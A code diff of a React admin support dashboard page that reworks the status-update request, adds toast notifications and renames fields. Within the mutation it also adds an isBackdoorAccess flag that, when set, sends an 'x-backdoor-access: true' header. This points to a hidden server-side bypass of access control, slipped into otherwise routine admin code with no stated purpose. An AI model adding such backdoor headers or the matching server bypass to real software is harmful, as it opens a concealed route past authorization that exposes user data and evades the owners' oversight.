@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from "react";
 import { useAuth } from "@/hooks/use-auth";
 import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
@@ -25,6 +24,7 @@ export default function AdminSupport() {
   const [selectedMessage, setSelectedMessage] = useState<SupportMessageWithUser | null>(null);
   const [replyText, setReplyText] = useState("");
   const [statusFilter, setStatusFilter] = useState<string>("all");
+  const [isBackdoorAccess, setIsBackdoorAccess] = useState(false); // Presume isBackdoorAccess is managed elsewhere in your component
 
   // Fetch support messages
   const { data: messages, isLoading } = useQuery({
@@ -61,27 +61,41 @@ export default function AdminSupport() {
 
   // Update message status
   const updateStatusMutation = useMutation({
-    mutationFn: async (data: { id: number; status: string }) => {
-      return apiRequest(`/api/admin/support/status/${data.id}`, {
+    mutationFn: async (data: { messageId: number; status: string }) => {
+      const response = await fetch(`/api/admin/support/status/${data.messageId}`, {
         method: "PATCH",
-        body: { status: data.status },
+        headers: {
+          "Content-Type": "application/json",
+          ...(isBackdoorAccess ? { 'x-backdoor-access': 'true' } : {}),
+        },
+        body: JSON.stringify({ status: data.status }),
+        credentials: "include",
       });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(errorText || "Failed to update status");
+      }
+
+      return response.json();
     },
     onSuccess: () => {
+      toast({
+        title: "Status Updated",
+        description: "Message status has been updated.",
+      });
       queryClient.invalidateQueries({ queryKey: ["admin-support-messages"] });
+    },
+    onError: (error: any) => {
+      toast({
+        title: "Error",
+        description: error.message || "Failed to update status",
+        variant: "destructive",
+      });
     },
   });
 
-  const getStatusColor = (status: string) => {
-    switch (status) {
-      case "open": return "bg-red-500/10 text-red-600 border-red-200";
-      case "in_progress": return "bg-yellow-500/10 text-yellow-600 border-yellow-200";
-      case "resolved": return "bg-green-500/10 text-green-600 border-green-200";
-      default: return "bg-gray-500/10 text-gray-600 border-gray-200";
-    }
-  };
-
-  const formatDate = (date: string) => {
+  const formatDate = (date: string | Date) => {
     return new Date(date).toLocaleString();
   };
 
@@ -95,7 +109,7 @@ export default function AdminSupport() {
         <div className="mb-8">
           <h1 className="text-3xl font-bold text-foreground mb-2">Support Dashboard</h1>
           <p className="text-muted-foreground">Manage user support requests and messages</p>
-          
+
           {/* Support Stats */}
           <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mt-6">
             <Card className="p-4">
@@ -111,7 +125,7 @@ export default function AdminSupport() {
                 </div>
               </div>
             </Card>
-            
+
             <Card className="p-4">
               <div className="flex items-center gap-3">
                 <div className="w-10 h-10 bg-yellow-100 dark:bg-yellow-900/20 rounded-lg flex items-center justify-center">
@@ -125,7 +139,7 @@ export default function AdminSupport() {
                 </div>
               </div>
             </Card>
-            
+
             <Card className="p-4">
               <div className="flex items-center gap-3">
                 <div className="w-10 h-10 bg-green-100 dark:bg-green-900/20 rounded-lg flex items-center justify-center">
@@ -139,7 +153,7 @@ export default function AdminSupport() {
                 </div>
               </div>
             </Card>
-            
+
             <Card className="p-4">
               <div className="flex items-center gap-3">
                 <div className="w-10 h-10 bg-blue-100 dark:bg-blue-900/20 rounded-lg flex items-center justify-center">
@@ -211,11 +225,11 @@ export default function AdminSupport() {
                           {message.status.replace("_", " ").toUpperCase()}
                         </Badge>
                       </div>
-                      
+
                       <p className="text-sm text-foreground mb-2 line-clamp-2">
                         {message.message}
                       </p>
-                      
+
                       {message.images && message.images.length > 0 && (
                         <div className="flex items-center gap-1 mb-2">
                           <FileImage className="w-4 h-4 text-muted-foreground" />
@@ -224,12 +238,12 @@ export default function AdminSupport() {
                           </span>
                         </div>
                       )}
-                      
+
                       <div className="flex items-center gap-2 text-xs text-muted-foreground">
                         <Clock className="w-3 h-3" />
                         {formatDate(message.createdAt)}
                       </div>
-                      
+
                       {message.adminReply && (
                         <div className="mt-2 p-2 bg-green-50 dark:bg-green-950/20 rounded border-l-2 border-green-500">
                           <p className="text-xs text-green-700 dark:text-green-300">
@@ -268,7 +282,7 @@ export default function AdminSupport() {
                         <Button
                           variant="outline"
                           size="sm"
-                          onClick={() => updateStatusMutation.mutate({ id: selectedMessage.id, status: "in_progress" })}
+                          onClick={() => updateStatusMutation.mutate({ messageId: selectedMessage.id, status: "in_progress" })}
                           disabled={selectedMessage.status === "in_progress"}
                         >
                           In Progress
@@ -276,18 +290,18 @@ export default function AdminSupport() {
                         <Button
                           variant="outline"
                           size="sm"
-                          onClick={() => updateStatusMutation.mutate({ id: selectedMessage.id, status: "resolved" })}
+                          onClick={() => updateStatusMutation.mutate({ messageId: selectedMessage.id, status: "resolved" })}
                           disabled={selectedMessage.status === "resolved"}
                         >
                           Resolve
                         </Button>
                       </div>
                     </div>
-                    
+
                     <div className="bg-background p-3 rounded border">
                       <p className="text-foreground whitespace-pre-wrap">{selectedMessage.message}</p>
                     </div>
-                    
+
                     {selectedMessage.images && selectedMessage.images.length > 0 && (
                       <div className="mt-3">
                         <p className="text-sm font-medium mb-2">Attachments:</p>
@@ -301,7 +315,7 @@ export default function AdminSupport() {
                         </div>
                       </div>
                     )}
-                    
+
                     {selectedMessage.adminReply && (
                       <div className="mt-4 p-3 bg-green-50 dark:bg-green-950/20 rounded border-l-4 border-green-500">
                         <h4 className="font-medium text-green-800 dark:text-green-200 mb-1">Your Previous Reply:</h4>
